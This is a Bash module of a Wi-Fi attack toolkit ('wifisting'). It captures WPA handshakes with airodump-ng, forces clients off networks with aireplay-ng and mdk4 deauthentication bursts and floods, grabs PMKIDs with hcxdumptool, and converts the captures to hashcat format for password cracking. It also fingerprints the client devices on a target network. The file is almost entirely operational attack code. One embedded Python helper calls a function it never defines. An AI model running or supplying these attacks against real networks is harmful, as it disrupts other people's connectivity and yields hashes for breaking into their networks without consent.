#!/usr/bin/env bash
# attack — handshake capture, deauth, pmkid
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$HOME/wifisting/loot}"
: "${CAPTURES_DIR:=$HOME/wifisting/captures}"
: "${LOGS_DIR:=$HOME/wifisting/logs}"
: "${WIFISTING_HOME:=$HOME/wifisting}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" 2>/dev/null

# Handshake and PMKID captures are the most valuable output this
# module produces. Store them under captures/ so they survive a
# reboot instead of vanishing with /tmp.
ATTACK_DIR="$CAPTURES_DIR/attack"
mkdir -p "$ATTACK_DIR"

# One-time migration: bring any handshakes left behind in the old
# /tmp/wifisting/attack or $WIFISTING_HOME/state/attack into the new
# location. Idempotent — safe to run on every invocation.
attack_migrate_captures() {
    local src f base count=0
    for src in "$TMP_DIR/attack" "${WIFISTING_HOME:-$HOME/wifisting}/state/attack"; do
        [[ -d "$src" ]] || continue
        [[ "$src" == "$ATTACK_DIR" ]] && continue
        shopt -s nullglob
        for f in "$src"/hs-*.cap "$src"/pmkid-*.pcapng "$src"/*.22000; do
            base=$(basename "$f")
            if [[ ! -e "$ATTACK_DIR/$base" ]]; then
                mv "$f" "$ATTACK_DIR/$base" 2>/dev/null && count=$((count + 1))
            fi
        done
        shopt -u nullglob
    done

    # Rewrite the last_handshake pointer if it points at a moved file.
    if [[ -f "$TMP_DIR/last_handshake" ]]; then
        local lh lhb
        lh=$(<"$TMP_DIR/last_handshake")
        if [[ -n "$lh" && ! -f "$lh" ]]; then
            lhb=$(basename "$lh")
            [[ -f "$ATTACK_DIR/$lhb" ]] && \
                printf '%s\n' "$ATTACK_DIR/$lhb" > "$TMP_DIR/last_handshake"
        fi
    fi

    [[ $count -gt 0 ]] && \
        printf '[info] migrated %d capture(s) to %s\n' "$count" "$ATTACK_DIR" >&2
    return 0
}

attack_prepare() {
    mkdir -p "$ATTACK_DIR"
    attack_migrate_captures
}

attack_require() {
    # rehydrate from state files
    [[ -z "$MON_IFACE"      && -f "$TMP_DIR/mon_iface"      ]] && export MON_IFACE="$(cat "$TMP_DIR/mon_iface")"
    [[ -z "$TARGET_BSSID"   && -f "$TMP_DIR/target_bssid"   ]] && export TARGET_BSSID="$(cat "$TMP_DIR/target_bssid")"
    [[ -z "$TARGET_CHANNEL" && -f "$TMP_DIR/target_channel" ]] && export TARGET_CHANNEL="$(cat "$TMP_DIR/target_channel")"
    [[ -z "$TARGET_ESSID"   && -f "$TMP_DIR/target_essid"   ]] && export TARGET_ESSID="$(cat "$TMP_DIR/target_essid")"

    if [[ -z "$MON_IFACE" ]]; then
        err "no monitor interface — set it up in iface menu"
        [[ -z "${WIFISTING_CLI:-}" ]] && read -rp "  press enter " _
        return 1
    fi
    if [[ -z "$TARGET_BSSID" || -z "$TARGET_CHANNEL" ]]; then
        err "no target — pick one in recon menu"
        [[ -z "${WIFISTING_CLI:-}" ]] && read -rp "  press enter " _
        return 1
    fi
    return 0
}

# ── FIXED: verify channel lock before capture ──
attack_lock_channel() {
    local want="$TARGET_CHANNEL"
    local before iwerr
    before=$(iw dev "$MON_IFACE" info 2>/dev/null | awk '/channel/ {print $2; exit}')

    # Diagnose from iw's own error rather than pre-checking sysfs: a wlx* name
    # is derived from the adapter MAC, so spoofing the MAC or replugging renames
    # the adapter and the recorded name then points at nothing. That surfaced as
    # "could not set channel", sending the operator after a channel problem that
    # did not exist. Interpreting iw keeps the reason authoritative and stays
    # testable against a stubbed iw.
    if ! iwerr=$(iw dev "$MON_IFACE" set channel "$want" 2>&1); then
        case "$iwerr" in
            *"No such device"*|*"no such device"*)
                printf 'ERR\tmonitor interface %s does not exist — the adapter was renamed or unplugged; re-enable monitor mode in Interface Manager\n' "$MON_IFACE" ;;
            *"not monitor"*|*"Operation not supported"*|*"Resource busy"*|*"resource busy"*)
                printf 'ERR\tcould not set %s to channel %s: %s — is it in monitor mode?\n' >&2 \
                    "$MON_IFACE" "$want" "$iwerr" ;;
            *)
                if [[ -n "$iwerr" ]]; then
                    printf 'ERR\tcould not set %s to channel %s: %s\n' >&2 \
                        "$MON_IFACE" "$want" "$iwerr"
                else
                    printf 'ERR\tcould not set %s to channel %s\n' >&2 \
                        "$MON_IFACE" "$want"
                fi ;;
        esac
        return 1
    fi

    sleep 0.3
    local got
    got=$(iw dev "$MON_IFACE" info 2>/dev/null | awk '/channel/ {print $2; exit}')

    if [[ "$got" != "$want" ]]; then
        printf 'ERR\tchannel lock mismatch: asked=%s got=%s\n' >&2 "$want" "$got"
        return 1
    fi
    printf 'OK\t%s channel %s\n' "$MON_IFACE" "$want"
    return 0
}

# ── interactive handshake capture ──
attack_capture_handshake() {
    attack_require || return
    attack_prepare
    attack_lock_channel || { read -rp "  press enter " _; return 1; }

    local ts prefix
    ts=$(date +%Y%m%d-%H%M%S)
    prefix="$ATTACK_DIR/hs-${TARGET_ESSID//[^A-Za-z0-9]/_}-$ts"

    info "capturing to: ${prefix}-01.cap"

    # xterm only if we have a display; otherwise log in background
    local adump_pid=""
    if [[ -n "${DISPLAY:-}" ]] && command -v xterm >/dev/null 2>&1; then
        xterm -T "airodump: $TARGET_ESSID" -e \
            "airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $prefix $MON_IFACE" &
        adump_pid=$!
    else
        airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" \
            -w "$prefix" "$MON_IFACE" \
            > "$ATTACK_DIR/airodump.log" 2>&1 &
        adump_pid=$!
        info "no display — running airodump in background, log at $ATTACK_DIR/airodump.log"
    fi
    sleep 3

    echo ""
    echo "  handshake capture running."
    echo "    [1] send deauth burst (aireplay-ng, broadcast)"
    echo "    [2] send deauth burst (mdk4, aggressive)"
    echo "    [3] targeted deauth to specific client"
    echo "    [4] wait passively (no deauth)"
    echo "    [0] stop capture"
    echo ""

    while true; do
        read -rp "  attack> " c
        case "$c" in
            1)
                info "aireplay-ng: 10 broadcast deauth"
                aireplay-ng --deauth 10 -a "$TARGET_BSSID" "$MON_IFACE"
                ;;
            2)
                info "mdk4 deauth (10s)"
                timeout 10 mdk4 "$MON_IFACE" d -B "$TARGET_BSSID" -c "$TARGET_CHANNEL" 2>/dev/null
                ok "mdk4 done"
                ;;
            3)
                read -rp "  client MAC> " cmac
                if [[ "$cmac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                    aireplay-ng --deauth 10 -a "$TARGET_BSSID" -c "$cmac" "$MON_IFACE"
                else
                    err "invalid MAC"
                fi
                ;;
            4) info "waiting passively... hit 0 when ready" ;;
            0) break ;;
            *) warn "invalid" ;;
        esac
    done

    info "stopping airodump..."
    kill -INT "$adump_pid" 2>/dev/null
    sleep 2
    kill -TERM "$adump_pid" 2>/dev/null
    pkill -f "airodump-ng.*$prefix" 2>/dev/null

    local cap="${prefix}-01.cap"
    if [[ -f "$cap" ]]; then
        ok "capture saved: $cap"
        if aircrack-ng "$cap" 2>/dev/null | grep -qE "1 handshake|WPA \([0-9]+ handshake"; then
            ok "handshake detected in capture"
            export LAST_HANDSHAKE="$cap"
            echo "$cap" > "$TMP_DIR/last_handshake"
        else
            warn "no handshake detected — try again or use pmkid"
        fi
    else
        err "capture file missing"
    fi
    read -rp "  press enter " _
}

attack_pmkid() {
    # The interactive menu entry delegates to the CLI implementation.
    #
    # These were two copies of the same capture logic, and a fix for the
    # hcxdumptool v6 CLI change landed in only one of them - so the path the
    # GUI actually used kept failing with "tr: write error: Broken pipe"
    # while the other copy looked correct. One implementation now.
    local rc
    attack_cli_pmkid 60
    rc=$?
    [[ $rc -ne 0 && -z "${WIFISTING_CLI:-}" ]] && read -rp "  press enter " _
    return $rc
}

attack_deauth_flood() {
    attack_require || return
    attack_lock_channel || return
    warn "sustained deauth — loud and obvious"
    read -rp "  duration seconds (default 30)> " d
    [[ -z "$d" || ! "$d" =~ ^[0-9]+$ ]] && d=30
    info "flooding for ${d}s..."
    timeout "$d" mdk4 "$MON_IFACE" d -B "$TARGET_BSSID" -c "$TARGET_CHANNEL" 2>/dev/null
    ok "done"
    read -rp "  press enter " _
}

attack_convert_cap() {
    mkdir -p "$ATTACK_DIR"
    local cap
    if [[ -n "$LAST_HANDSHAKE" && -f "$LAST_HANDSHAKE" ]]; then
        cap="$LAST_HANDSHAKE"
    else
        cap=$(ls -t "$ATTACK_DIR"/hs-*-01.cap 2>/dev/null | head -1)
    fi
    if [[ -z "$cap" || ! -f "$cap" ]]; then
        err "no .cap file found"
        read -rp "  press enter " _; return
    fi
    local hash="${cap%.cap}.22000"
    info "converting $cap -> $hash"
    hcxpcapngtool -o "$hash" "$cap" 2>&1 | tail -20
    if [[ -s "$hash" ]]; then
        ok "hash saved: $hash"
        export LAST_HASH="$hash"
        echo "$hash" > "$TMP_DIR/last_hash"
    else
        err "conversion produced empty file"
    fi
    read -rp "  press enter " _
}

attack_menu() {
    while true; do
        banner 2>/dev/null || clear
        echo "  === attack ==="
        [[ -n "$TARGET_ESSID" ]] && echo "  target: $TARGET_ESSID ($TARGET_BSSID) ch $TARGET_CHANNEL"
        [[ -n "$LAST_HANDSHAKE" ]] && echo "  last cap:  $LAST_HANDSHAKE"
        [[ -n "$LAST_HASH" ]] && echo "  last hash: $LAST_HASH"
        echo ""
        cat << 'M'
  [1]  capture WPA handshake (airodump + deauth options)
  [2]  PMKID attack (hcxdumptool)
  [3]  deauth flood (mdk4, sustained)
  [4]  convert last .cap -> .22000 (hashcat format)
  [0]  back

M
        read -rp "  choice> " c
        case "$c" in
            1) attack_capture_handshake ;;
            2) attack_pmkid ;;
            3) attack_deauth_flood ;;
            4) attack_convert_cap ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── CLI ──

attack_cli_status_tsv() {
    attack_require 2>/dev/null || true
    local hs="" hsh="" cap_pid=""
    [[ -f "$TMP_DIR/last_handshake" ]] && hs=$(<"$TMP_DIR/last_handshake")
    [[ -f "$TMP_DIR/last_hash" ]]      && hsh=$(<"$TMP_DIR/last_hash")
    # Report capture_pid only if that process is ACTUALLY ALIVE. Reporting it
    # from file existence alone made the GUI's status pill stick on "Capturing"
    # forever after a stop, and after any crash that left a stale pidfile.
    if [[ -f "$TMP_DIR/attack_capture.pid" ]]; then
        local _cp
        _cp=$(<"$TMP_DIR/attack_capture.pid")
        [[ -n "$_cp" && -d "/proc/$_cp" ]] && cap_pid="$_cp"
    fi
    printf 'target_bssid\t%s\n'   "${TARGET_BSSID:-}"
    printf 'target_essid\t%s\n'   "${TARGET_ESSID:-}"
    printf 'target_channel\t%s\n' "${TARGET_CHANNEL:-}"
    printf 'mon_iface\t%s\n'      "${MON_IFACE:-}"
    printf 'last_handshake\t%s\n' "$hs"
    printf 'last_hash\t%s\n'      "$hsh"
    printf 'capture_pid\t%s\n'    "$cap_pid"
}

# ── FIXED: capture_start with proper trap and lock check ──
attack_cli_capture_start() {
    local prefix="$1"
    [[ -z "$prefix" ]] && { printf 'missing prefix\n' >&2; return 2; }
    attack_require || return 1
    attack_prepare
    iface_lock_claim "$MON_IFACE" "03_attack" || return 1

    if ! attack_lock_channel; then
        printf 'ERROR\tchannel lock failed\n' >&2
        return 1
    fi

    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" \
        -w "$prefix" "$MON_IFACE" &
    local adump_pid=$!
    echo "$adump_pid" > "$TMP_DIR/attack_capture.pid"

    # NOTE: single-quoted trap strings — $adump_pid expands when the trap
    # fires, not when it's defined. The old code tried to force expansion
    # at definition time with nested quoting, which broke the handler.
    trap 'kill -INT "$adump_pid" 2>/dev/null' INT
    trap 'kill -TERM "$adump_pid" 2>/dev/null' TERM

    wait "$adump_pid"
    local rc=$?
    rm -f "$TMP_DIR/attack_capture.pid"

    local cap="${prefix}-01.cap"
    if [[ -f "$cap" ]]; then
        if aircrack-ng "$cap" 2>/dev/null | grep -qE "1 handshake|WPA \([0-9]+ handshake"; then
            echo "$cap" > "$TMP_DIR/last_handshake"
            printf 'HANDSHAKE=%s\n' "$cap"
        else
            printf 'NOHANDSHAKE=%s\n' "$cap"
        fi
    fi
    return "$rc"
}

# ── NEW: explicit stop ──
# Kill one pid with escalating signals; returns 0 only once it is GONE.
attack_kill_pid() {
    local pid="$1" i
    # Liveness via /proc, NOT `kill -0`: EPERM on a root-owned process is not
    # the same as the process being gone, and treating it as gone made this
    # report success while airodump kept running.
    [[ -d "/proc/$pid" ]] || return 0
    kill -INT  "-$pid" 2>/dev/null || kill -INT  "$pid" 2>/dev/null
    for i in 1 2 3 4 5 6 7 8 9 10; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -TERM "-$pid" 2>/dev/null || kill -TERM "$pid" 2>/dev/null
    for i in 1 2 3 4 5; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -KILL "-$pid" 2>/dev/null || kill -KILL "$pid" 2>/dev/null
    sleep 0.3
    [[ -d "/proc/$pid" ]] && return 1
    return 0
}

attack_cli_capture_stop() {
    local pidfile="$TMP_DIR/attack_capture.pid"
    local pid="" killed=0

    [[ -f "$pidfile" ]] && pid=$(<"$pidfile")

    if [[ -n "$pid" ]] && attack_kill_pid "$pid"; then
        killed=1
    fi

    # Fallback: the pidfile is often already gone (a previous stop deleted it,
    # or the parent shell died) while airodump kept running. Without this the
    # capture is unstoppable, because the pidfile was the only handle to it.
    if (( killed == 0 )); then
        # Match only REAL airodump-ng processes (pgrep -x on the executable
        # name). A `pgrep -f` substring match also hits any shell whose
        # command line merely mentions airodump + the capture dir — including
        # the caller of this very function, which then got SIGTERM'd.
        local op
        for op in $(pgrep -x airodump-ng 2>/dev/null); do
            [[ "$op" == "$$" || "$op" == "$PPID" ]] && continue
            tr '\0' ' ' < "/proc/$op/cmdline" 2>/dev/null \
                | grep -q -- "$ATTACK_DIR/" || continue
            if attack_kill_pid "$op"; then
                killed=1; pid="$op"
            fi
            break
        done
    fi

    if (( killed == 1 )); then
        rm -f "$pidfile"
        printf 'STOPPED\t%s\n' "$pid"
        return 0
    fi

    # Do NOT delete the pidfile on failure, and never claim success: the old
    # version printed STOPPED and removed the pidfile even when the kill had
    # not taken effect, which orphaned airodump with no way to find it again.
    if [[ -n "$pid" ]]; then
        printf 'ERROR\tcapture pid %s still running after SIGKILL\n' "$pid" >&2
        return 1
    fi
    printf 'NOCAPTURE\n'
    return 0
}

# Refuse to claim success on an adapter that cannot transmit.
#
# aireplay-ng and mdk4 exit 0 whether or not a frame actually leaves the
# radio, so on a non-injecting adapter every deauth "succeeds" while nothing
# happens on the air - no client disconnects, no handshake follows, and no
# EAPOL ever appears. Intel iwlwifi is the common case: it receives in
# monitor mode but its firmware will not inject.
attack_require_injection() {
    local drv inject
    drv=$(basename "$(readlink -f "/sys/class/net/$MON_IFACE/device/driver" 2>/dev/null)" 2>/dev/null)
    if [[ "$drv" == "iwlwifi" ]]; then
        printf 'ERROR\t%s is an Intel (iwlwifi) adapter - it cannot inject frames\n' "$MON_IFACE" >&2
        printf 'ERROR\tuse an Atheros AR9271 (ath9k_htc) for deauth and flooding\n' >&2
        printf 'ERROR\tIntel is fine for scanning and passive capture only\n' >&2
        return 1
    fi
    # For anything else, probe - but only WARN on an inconclusive result.
    #
    # aireplay-ng --test cycles channels and needs 15-20s to conclude; an
    # 8s timeout truncated it, so a working AR9271 was reported as unable to
    # inject and every deauth was blocked. A flaky runtime probe must not
    # veto a legitimate adapter: the driver check above is authoritative,
    # this is only advisory.
    if command -v aireplay-ng >/dev/null 2>&1; then
        inject=$(timeout 20 aireplay-ng --test "$MON_IFACE" 2>&1 || true)
        if grep -qE 'Injection is working|Injection test passed' <<<"$inject"; then
            printf 'OK\tinjection verified on %s\n' "$MON_IFACE" >&2
        else
            printf 'WARN\tinjection test inconclusive on %s - proceeding anyway\n' \
                "$MON_IFACE" >&2
            printf 'WARN\tif deauth has no effect, the adapter may not inject\n' >&2
        fi
    fi
    return 0
}


attack_cli_deauth_broadcast() {
    local count="${1:-10}"
    attack_require || return 1
    attack_require_injection || return 1
    if ! attack_lock_channel >&2; then
        printf 'ERROR	could not lock %s to channel %s — aborting deauth\n' \
            "$MON_IFACE" "$TARGET_CHANNEL" >&2
        return 1
    fi
    aireplay-ng --deauth "$count" -a "$TARGET_BSSID" "$MON_IFACE"
}

attack_cli_deauth_client() {
    local mac="$1" count="${2:-10}"
    [[ -z "$mac" ]] && { printf 'missing client mac\n' >&2; return 2; }
    attack_require || return 1
    attack_require_injection || return 1
    if ! attack_lock_channel >&2; then
        printf 'ERROR	could not lock %s to channel %s — aborting deauth\n' \
            "$MON_IFACE" "$TARGET_CHANNEL" >&2
        return 1
    fi
    aireplay-ng --deauth "$count" -a "$TARGET_BSSID" -c "$mac" "$MON_IFACE"
}

attack_cli_deauth_flood() {
    local dur="${1:-30}"
    attack_require || return 1
    attack_require_injection || return 1
    if ! attack_lock_channel >&2; then
        printf 'ERROR	could not lock %s to channel %s — aborting flood\n' \
            "$MON_IFACE" "$TARGET_CHANNEL" >&2
        return 1
    fi
    timeout "$dur" mdk4 "$MON_IFACE" d -B "$TARGET_BSSID" \
        -c "$TARGET_CHANNEL" 2>/dev/null
}

attack_cli_pmkid() {
    local dur="${1:-60}"
    attack_require || return 1
    attack_prepare
    attack_lock_channel >&2 || return 1

    local ts out
    ts=$(date +%Y%m%d-%H%M%S)
    out="$ATTACK_DIR/pmkid-${TARGET_ESSID//[^A-Za-z0-9]/_}-$ts.pcapng"

    # hcxdumptool rewrote its CLI at v6: --filterlist_ap, --filtermode and
    # --enable_status were replaced by --bpf. A v6 binary exits immediately on
    # the unknown option, which also broke the process substitution - the
    # visible symptom was "tr: write error: Broken pipe", not the real error,
    # because both branches discarded stderr.
    local ver major ef reason
    ver=$(hcxdumptool --version 2>/dev/null | awk 'NR==1{print $2}')
    major=${ver%%.*}
    ef="$ATTACK_DIR/hcxdumptool.err"
    : > "$ef"

    if [[ "${major:-0}" -ge 6 ]]; then
        # --bpf wants COMPILED kernel BPF, not a filter expression: the man
        # page's own recipe is `tcpdump ... -ddd > attack.bpf`. Passing the
        # expression made hcxdumptool report "failed to read BPF", never open
        # its socket, and still leave a pcapng behind - so every run produced
        # a 488-byte header-only file that looked like a capture and held
        # nothing. -y sets the link type so no interface (and no root) is
        # needed just to compile the filter.
        local bpf="$ATTACK_DIR/pmkid.bpf"
        if tcpdump -y IEEE802_11_RADIO -ddd \
               "wlan addr1 $TARGET_BSSID or wlan addr2 $TARGET_BSSID" \
               > "$bpf" 2>/dev/null && [[ -s "$bpf" ]]; then
            timeout "$dur" hcxdumptool -i "$MON_IFACE" -w "$out" --bpf="$bpf" \
                >/dev/null 2>"$ef"
        else
            # Compiling failed; capture unfiltered rather than not at all.
            # Narrowing happens in the analysis pass anyway.
            printf 'WARN\tcould not compile a BPF filter; capturing unfiltered\n' >&2
            timeout "$dur" hcxdumptool -i "$MON_IFACE" -w "$out" \
                >/dev/null 2>"$ef"
        fi
    else
        timeout "$dur" hcxdumptool -i "$MON_IFACE" -w "$out" \
            --filterlist_ap=<(echo "$TARGET_BSSID" | tr -d ':') \
            --filtermode=2 >/dev/null 2>"$ef"
    fi

    if [[ ! -s "$out" ]]; then
        reason=$(grep -viE '^$|requesting interface|please be patient|^hcxdumptool [0-9]' \
            "$ef" 2>/dev/null | tail -2 | tr '\n' ' ')
        printf 'ERROR\thcxdumptool captured nothing%s\n' "${reason:+: $reason}" >&2
        printf 'ERROR\thcxdumptool %s, iface %s (%s), ch %s\n' \
            "${ver:-?}" "$MON_IFACE" \
            "$(iw dev "$MON_IFACE" info 2>/dev/null | awk '/type/{print $2}')" \
            "${TARGET_CHANNEL:-?}" >&2
        printf 'ERROR\tlog: %s\n' "$ef" >&2
        return 1
    fi

    if [[ -s "$out" ]]; then
        local hash="${out%.pcapng}.22000"
        hcxpcapngtool -o "$hash" "$out" >&2
        if [[ -s "$hash" ]]; then
            echo "$hash" > "$TMP_DIR/last_hash"
            printf 'HASH=%s\n' "$hash"
            return 0
        fi
        printf 'NOHASH=%s\n' "$out"
        return 1
    fi
    printf 'CAPTURE_EMPTY\n'
    return 1
}

attack_cli_convert() {
    local cap="$1"
    mkdir -p "$ATTACK_DIR"
    if [[ -z "$cap" ]]; then
        cap=$(ls -t "$ATTACK_DIR"/hs-*-01.cap 2>/dev/null | head -1)
    fi
    [[ -z "$cap" || ! -f "$cap" ]] && { printf 'no cap file\n' >&2; return 1; }
    local hash="${cap%.cap}.22000"
    hcxpcapngtool -o "$hash" "$cap" >&2
    if [[ -s "$hash" ]]; then
        echo "$hash" > "$TMP_DIR/last_hash"
        printf 'HASH=%s\n' "$hash"
    else
        printf 'NOHASH\n'
        return 1
    fi
}

# Stations on the target, with what can actually be inferred about them.
#
# Read from recon.json rather than the airodump CSV, which only exists while
# a scan is running - the clients list used to empty out at random because
# of that. Vendor comes from the local IEEE OUI database, but a randomised
# MAC is flagged rather than resolved: looking up the "vendor" of a randomly
# generated address returns a real company that has nothing to do with the
# device, which is worse than saying nothing.
attack_cli_clients_enriched_tsv() {
    local bssid="${1:-}"
    [ -z "$bssid" ] && bssid="${TARGET_BSSID:-}"
    [ -z "$bssid" ] && [ -f "$TMP_DIR/target_bssid" ] && \
        bssid=$(cat "$TMP_DIR/target_bssid")
    [ -z "$bssid" ] && {
        printf 'INFO\tno target BSSID set — pick one in Wi-Fi Recon\n'
        return 0
    }

    local jf="${RECON_STATE_FILE:-$WIFISTING_ROOT/state/recon.json}"
    [ -s "$jf" ] || { printf 'INFO\tno recon state yet — run a scan first\n'; return 0; }

    OUI_DB=/usr/share/ieee-data/oui.txt \
    python3 - "$jf" "$bssid" <<'PY'

def _wf_tsv(x):
    """Strip characters that break a TSV row.
    An SSID is attacker-controlled: a network can call itself
    "Foo<TAB>critical<TAB>OPEN" and forge an entire row in any consumer
    that splits on tab. Same class as the payloads this toolkit tests
    for, aimed inward. Tabs and line breaks become spaces so the field
    keeps its shape and the forgery shows up as mangled text.
    """
    return str(x).replace("\t", " ").replace("\r", " ").replace("\n", " ")
import json, os, re, sys

state, target = sys.argv[1], sys.argv[2].strip().lower()

oui = {}
db = os.environ.get("OUI_DB", "")
if os.path.isfile(db):
    try:
        with open(db, errors="ignore") as fh:
            for line in fh:
                m = re.match(r"^([0-9A-F]{6})\s+\(base 16\)\s+(.+?)\s*$", line)
                if m:
                    oui[m.group(1)] = m.group(2)
    except Exception:
        pass

# Vendor name -> device class. The OUI database already covers every IEEE
# registration, so the gap is not coverage but readability: "Apple, Inc."
# says less than "phone / laptop". Patterns are matched in order, longest
# first, because vendor strings overlap ("Hewlett Packard Enterprise" vs
# "Hewlett Packard").
VENDOR_CLASS = [
    ("apple",            "Apple device"),
    ("samsung",          "phone / tablet"),
    ("xiaomi",           "phone / IoT"),
    ("huawei",           "phone / network"),
    ("honor",            "phone"),
    ("oppo",             "phone"),
    ("vivo",             "phone"),
    ("oneplus",          "phone"),
    ("motorola",         "phone"),
    ("nokia",            "phone"),
    ("sony",             "phone / console"),
    ("lg electronics",   "phone / TV"),
    ("google",           "phone / smart home"),
    ("amazon",           "smart speaker / IoT"),
    ("espressif",        "IoT module"),
    ("tuya",             "IoT device"),
    ("sonoff",           "IoT device"),
    ("shelly",           "IoT device"),
    ("raspberry",        "single-board computer"),
    ("intel",            "laptop / desktop"),
    ("dell",             "laptop / desktop"),
    ("lenovo",           "laptop / desktop"),
    ("hewlett",          "laptop / printer"),
    ("asustek",          "laptop / phone"),
    ("micro-star",       "laptop / desktop"),
    ("gigabyte",         "laptop / desktop"),
    ("acer",             "laptop"),
    ("toshiba",          "laptop"),
    ("canon",            "printer"),
    ("epson",            "printer"),
    ("brother",          "printer"),
    ("lexmark",          "printer"),
    ("tp-link",          "network gear"),
    ("netgear",          "network gear"),
    ("ubiquiti",         "network gear"),
    ("sagemcom",         "ISP router"),
    ("technicolor",      "ISP router"),
    ("arris",            "ISP router"),
    ("sercomm",          "ISP router"),
    ("cisco",            "network gear"),
    ("d-link",           "network gear"),
    ("zyxel",            "network gear"),
    ("sonos",            "media device"),
    ("roku",             "media device"),
    ("chromecast",       "media device"),
    ("nvidia",           "media / GPU"),
    ("valve",            "console"),
    ("nintendo",         "console"),
    ("microsoft",        "console / laptop"),
    ("realtek",          "network / audio"),
    ("broadcom",         "network / embedded"),
    ("qualcomm",         "phone chipset"),
    ("mediatek",         "phone chipset"),
    ("texas instruments", "embedded"),
    ("nordic semicond",  "embedded / BLE"),
]

def vendor(mac):
    return oui.get(mac.replace(":", "").upper()[:6], "")

def device_class(v):
    low = v.lower()
    for pat, cls in VENDOR_CLASS:
        if pat in low:
            return cls
    return ""

def randomised(mac):
    try:
        return bool(int(mac.split(":")[0], 16) & 0x02)
    except Exception:
        return False

try:
    d = json.load(open(state))
except Exception as e:
    sys.stderr.write("ERROR\t%s\n" % e); sys.exit(1)

print("MAC\tPOWER\tPACKETS\tFIRST_SEEN\tLAST_SEEN\tVENDOR\tCLASS\tRANDOM")
for st in (d.get("stations") or []):
    if (st.get("bssid") or "").lower() != target:
        continue
    mac = (st.get("station_mac") or "").upper()
    if not mac:
        continue
    rnd = randomised(mac)
    print("\t".join(_wf_tsv(x) for x in [
        mac,
        str(st.get("power", "-")),
        str(st.get("packets", 0)),
        str(st.get("first_seen", "-")),
        str(st.get("last_seen", "-")),
        "randomised MAC" if rnd else (vendor(mac) or "unknown vendor"),
        "randomised" if rnd else (device_class(vendor(mac)) or "unknown"),
        "yes" if rnd else "no",
    ]))
PY
}


attack_cli_list_clients_tsv() {
    local bssid="${1:-}"
    [ -z "$bssid" ] && bssid="${TARGET_BSSID:-}"
    [ -z "$bssid" ] && [ -f "$TMP_DIR/target_bssid" ] && \
        bssid=$(cat "$TMP_DIR/target_bssid")
    [ -z "$bssid" ] && {
        printf 'INFO\tno target BSSID set — pick one in Wi-Fi Recon\n'
        return 0
    }

    local csv
    csv=$(ls -t "$TMP_DIR"/recon/scan-*.csv 2>/dev/null | head -1)
    [ -z "$csv" ] && {
        printf 'INFO\tno recon CSV yet — run a scan first\n'
        return 0
    }

    RECON_CSV="$csv" TARGET_BSSID="$bssid" python3 - <<'PY'
import csv, os, sys

csv_path = os.environ["RECON_CSV"]
target   = os.environ["TARGET_BSSID"].strip().lower()

def c(v): return (v or "").strip()

try:
    fh = open(csv_path, encoding="utf-8-sig", errors="replace", newline="")
except OSError:
    sys.exit(0)

aps = {}          # bssid -> essid
stations = []     # (sta, bssid, power, pkts, first, last)
section = None
headers = []

with fh:
    reader = csv.reader(fh)
    for raw in reader:
        row = [c(v) for v in raw]
        if not any(row): continue
        first = row[0]
        if first == "BSSID":
            section = "ap"; headers = row; continue
        if first == "Station MAC":
            section = "sta"; headers = row; continue
        if section is None or not headers: continue
        row += [""] * (len(headers) - len(row))
        rec = dict(zip(headers, row))

        if section == "ap":
            b = c(rec.get("BSSID")).lower()
            e = c(rec.get("ESSID"))
            if b:
                aps[b] = e
        elif section == "sta":
            sta = c(rec.get("Station MAC"))
            b   = c(rec.get("BSSID")).lower()
            if not sta: continue
            stations.append({
                "sta":   sta,
                "bssid": b,
                "power": c(rec.get("Power")) or "?",
                "pkts":  c(rec.get("# packets")) or "0",
                "first": c(rec.get("First time seen")) or "?",
                "last":  c(rec.get("Last time seen")) or "?",
            })

# Resolve the target's ESSID, then collect all BSSIDs advertising it.
target_essid = aps.get(target, "")
if target_essid:
    related = {b for b, e in aps.items() if e and e == target_essid}
else:
    related = {target}

# Filter stations to any related BSSID.
matched = [s for s in stations if s["bssid"] in related]

if not matched:
    if target_essid:
        msg = (f"no stations on SSID '{target_essid}' "
               f"({len(related)} BSSID{'s' if len(related)!=1 else ''}) "
               f"in {os.path.basename(csv_path)}")
    else:
        msg = (f"no stations on {target} in "
               f"{os.path.basename(csv_path)}")
    print(f"INFO\t{msg}")
    sys.exit(0)

for s in matched:
    print("\t".join(_wf_tsv(x) for x in [s["sta"], s["power"], s["pkts"],
                      s["first"], s["last"]]))
PY
}

attack_needs_root() {
    case "$1" in
        --capture-start|--capture-stop|--deauth-broadcast|--deauth-client|--deauth-flood|--pmkid|--fragattacks)
            return 0 ;;
        *)  return 1 ;;
    esac
}

